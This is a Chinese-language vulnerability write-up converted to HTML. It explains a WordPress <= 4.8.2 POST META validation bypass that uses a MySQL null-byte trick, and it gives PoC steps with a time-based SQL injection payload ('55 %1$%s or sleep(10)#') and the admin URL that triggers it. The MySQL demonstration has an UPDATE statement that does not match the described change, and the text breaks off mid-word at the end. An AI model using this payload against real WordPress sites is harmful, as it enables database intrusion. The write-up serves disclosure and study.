<html><head><meta charset="utf-8" /><style>.pydocx-caps {text-transform:uppercase}.pydocx-center {text-align:center}.pydocx-comment {color:blue}.pydocx-delete {color:red;text-decoration:line-through}.pydocx-hidden {visibility:hidden}.pydocx-insert {color:green}.pydocx-left {text-align:left}.pydocx-list-style-type-cardinalText {list-style-type:decimal}.pydocx-list-style-type-decimal {list-style-type:decimal}.pydocx-list-style-type-decimalEnclosedCircle {list-style-type:decimal}.pydocx-list-style-type-decimalEnclosedFullstop {list-style-type:decimal}.pydocx-list-style-type-decimalEnclosedParen {list-style-type:decimal}.pydocx-list-style-type-decimalZero {list-style-type:decimal-leading-zero}.pydocx-list-style-type-lowerLetter {list-style-type:lower-alpha}.pydocx-list-style-type-lowerRoman {list-style-type:lower-roman}.pydocx-list-style-type-none {list-style-type:none}.pydocx-list-style-type-ordinalText {list-style-type:decimal}.pydocx-list-style-type-upperLetter {list-style-type:upper-alpha}.pydocx-list-style-type-upperRoman {list-style-type:upper-roman}.pydocx-right {text-align:right}.pydocx-small-caps {font-variant:small-caps}.pydocx-strike {text-decoration:line-through}.pydocx-tab {display:inline-block;width:4em}.pydocx-underline {text-decoration:underline}body {margin:0px auto}</style></head><body><h1>Wordpress &lt;= 4.8.2 POST META 校验绕过漏洞</h1><h2>一、漏洞简介</h2><h2>二、漏洞影响</h2><h2>三、复现过程</h2><h3>一个MySQL的trick</h3><ol class="pydocx-list-style-type-decimal"><li>. 正常的条件查询语句<br />mysql&gt; SELECT * FROM wp_postmeta WHERE meta_key = '_thumbnail_id';<br />+---------+---------+----------------+------------+<br />| meta_id | post_id | meta_key       | meta_value |<br />+---------+---------+----------------+------------+<br />|       4 |       4 | _thumbnail_id  | TESTC      |<br />+---------+---------+----------------+------------+<br />1 row in set (0.00 sec)</li><li>. 现在我们将_thumbnail_id修改成”\x00_thumbnail_id”<br />mysql&gt; update wp_postmeta set meta_key = concat(0x00,'TESTC') where meta_value = '_thumbnail_id';<br />Query OK, 0 rows affected (0.00 sec)<br />Rows matched: 0  Changed: 0  Warnings: 0</li><li>. 再次执行第一步的查询</li></ol><p>mysql&gt; SELECT * FROM wp_postmeta WHERE meta_key = '_thumbnail_id';<br />+---------+---------+----------------+------------+<br />| meta_id | post_id | meta_key       | meta_value |<br />+---------+---------+----------------+------------+<br />|       4 |       4 |  _thumbnail_id | TESTC      |<br />+---------+---------+----------------+------------+<br />1 row in set (0.00 sec)</p><p>我们可以发现依然可以查询出修改后的数据。</p><h3>POST META 校验绕过</h3><p>我们来看下检查meta_key的代码，文件./wp-includes/meta.php：</p><p>function is_protected_meta( $meta_key, $meta_type = null ) {<br />    $protected = ( '_' == $meta_key[0] );<br />    /**<br />     * Filters whether a meta key is protected.<br />     *<br />     * [@since](/since) 3.2.0<br />     *<br />     * [@param](/param) bool   $protected Whether the key is protected. Default false.<br />     * [@param](/param) string $meta_key  Meta key.<br />     * [@param](/param) string $meta_type Meta type.<br />     */<br />    return apply_filters( 'is_protected_meta', $protected, $meta_key, $meta_type );<br />}</p><p>is<em>protected_meta函数只检查了$meta_key的第一个字符是否以</em>开头。我们有了2.1的MySQL trick，想要绕过meta_key的检查就显得容易多了。</p><h3>poc</h3><p>添加自定义字段，meta_key为’_thumbnail_id’的meta_value为’55 %1$%s or sleep(10)#’<br />在添加自定义栏目/字段时抓包，将_thumbnail_id替换为%00_thumbnail_id<br />访问/wp-admin/edit.php?action=delete&amp;_wpnonce=xxx&amp;ids=55 %1$%s or sleep(10)#，触发SQL注入漏洞<br />参</p></body></html>